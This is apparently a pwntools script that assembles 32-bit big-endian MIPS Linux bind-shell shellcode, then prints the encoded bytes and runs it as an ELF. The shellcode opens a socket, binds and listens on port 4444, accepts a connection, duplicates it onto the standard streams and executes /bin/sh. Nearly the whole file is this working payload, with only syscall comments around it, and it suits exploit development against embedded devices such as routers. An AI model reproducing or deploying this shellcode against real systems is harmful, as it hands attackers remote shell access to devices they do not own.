from pwn import *

context.update(arch='mips', os='linux', bits=32, endian='big')

shellcode = asm('''

#### socketcall - socket(int family, int type, int protocol)

  li   $t7,-6
  nor  $t7,$t7,$zero
  addi $a0,$t7,-3
  addi $a1,$t7,-3
  slti $a2,$zero,-1
  sw   $a0,-12($sp)
  sw   $a1,-8($sp)
  sw   $a2,-4($sp)
  addi $a1,$sp,-12
  li   $t7,-2
  nor  $t7,$t7,$zero
  sw   $t7,-36($sp)
  lw   $a0,-36($sp)
  li   $v0,4102
  syscall 0x40404

#### socketcall - bind(int fd, struct sockaddr *umyaddr, int addrlen)
#### struct sockaddr {const 2byte AF_INET; 2byte port; 12byte null}

  sw   $v0,-4($sp)
  li   $t7,-3
  nor  $t7,$t7,$zero
  sw   $t7,-36($sp)
  lw   $a0,-36($sp)
  sw   $t7,-32($sp)
  lui  $t6,0x115c
  sw   $t6,-28($sp)
  sw   $zero,-24($sp)
  addi $a1,$sp,-30
  li   $t6,-17
  nor  $t6,$t6,-17
  lw   $t4,-4($sp)
  sw   $t4,-16($sp)
  sw   $a1,-12($sp)
  sw   $t6,-8($sp)
  addi $a1,$sp,-16
  li   $v0,4102
  syscall 0x40404

####socketcall - listen(int fd, int backlog)

  lw   $t4,-4($sp)
  sw   $t4,-32($sp)
  li   $t7,257
  sw   $t7,-28($sp)
  addi $a1,$sp,-32
  li   $t7,-5
  nor  $t7,$t7,$zero
  sw   $t7,-36($sp)
  lw   $a0,-36($sp)
  li   $v0,4102
  syscall 0x40404

####socketcall - accept(int fd, struct *sockaddr, int *len)

  sw   $zero,-24($sp)
  sw   $zero,-28($sp)
  li   $t7,-6
  nor  $t7,$t7,$zero
  sw   $t7,-36($sp)
  lw   $a0,-36($sp)
  li   $v0,4102
  syscall 0x40404

####dup2()

  sw $v0,-4($sp)
  li $t7, -3
  nor $t7, $t7, $zero
  lw $a0, -4($sp)
dup2_loop:
  move $a1, $t7
  li $v0, 4063
  syscall 0x40404
  li $s0, -1
  addi $t7, $t7, -1
  bne $t7, $s0, dup2_loop

####execuve('/bin/sh')

  slti $a2, $zero, -1
  lui $t7, 0x2f2f
  ori $t7, $t7, 0x6269
  sw $t7, -20($sp)
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t6, -16($sp)
  sw $zero, -12($sp)
  addi $a0, $sp, -20
  sw $a0, -8($sp)
  sw $zero, -4($sp)
  addi $a1, $sp, -8
  li $v0, 4011
  syscall 0x40404

''')

print(''.join(['\\x{:02x}'.format(ord(x)) for x in shellcode ]))

filename = make_elf(shellcode, extract=False)
p = process(filename)

pause()
